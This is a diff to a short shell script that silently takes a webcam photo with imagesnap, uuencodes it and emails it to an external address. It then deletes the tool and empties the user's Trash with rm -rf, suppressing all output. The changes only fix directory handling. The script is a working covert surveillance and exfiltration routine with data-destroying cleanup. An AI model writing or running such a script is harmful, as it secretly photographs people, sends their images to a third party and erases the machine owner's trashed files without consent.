@@ -2,6 +2,9 @@
 
 # Created by Austin Harshberger (2018)
 
+# Go to tmp directory
+cd /tmp
+
 # Temp to store filename
 FILENAME=""
 
@@ -18,8 +21,7 @@ chmod u+x /tmp/imagesnap > /dev/null 2>&1
 /tmp/imagesnap -w 1 ~/Desktop/test.jpg > /dev/null 2>&1
 
 # List tmp
-cd /tmp
-FILENAME="$(ls ls snapshot-*)"
+FILENAME="$(ls snapshot-*)"
 
 # Email photo 
 uuencode /tmp/$FILENAME $FILENAME | mail -s "photo of me" $EMAIL_TO_SEND > /dev/null 2>&1
@@ -32,3 +34,6 @@ rm -rf /tmp/imagesnap > /dev/null 2>&1
 
 # Clear trash
 rm -rf ~/.Trash*/ > /dev/null 2>&1
+
+# Go back to previous directory
+cd - > /dev/null 2>&1
